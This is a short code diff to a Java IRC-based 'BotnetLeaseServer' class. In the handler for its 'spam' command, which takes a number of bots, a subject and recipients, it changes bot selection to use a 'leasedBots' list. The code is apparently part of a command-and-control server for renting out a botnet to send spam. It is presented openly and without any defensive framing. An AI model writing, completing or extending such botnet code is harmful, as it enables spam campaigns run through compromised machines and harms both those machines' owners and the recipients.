@@ -289,7 +289,7 @@ public class BotnetLeaseServer extends PircBot {
 					System.out.println(Arrays.toString(parts));
 					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
 				} else {
-					String[] bots = getUserNames();
+					String[] bots = leasedBots;
 					if (!parts[1].equalsIgnoreCase("all")) {
 						int numBots = Integer.parseInt(parts[1]);
 						if (bots.length > numBots) {
@@ -322,7 +322,7 @@ public class BotnetLeaseServer extends PircBot {
 	
 	public String[] chooseBots(String[] arr, int index) {
 		if (arr[index].equalsIgnoreCase("all")) {
-			return getUserNames();
+			return leasedBots;
 		} else {
 			return Arrays.copyOfRange(arr, index, arr.length);
 		}
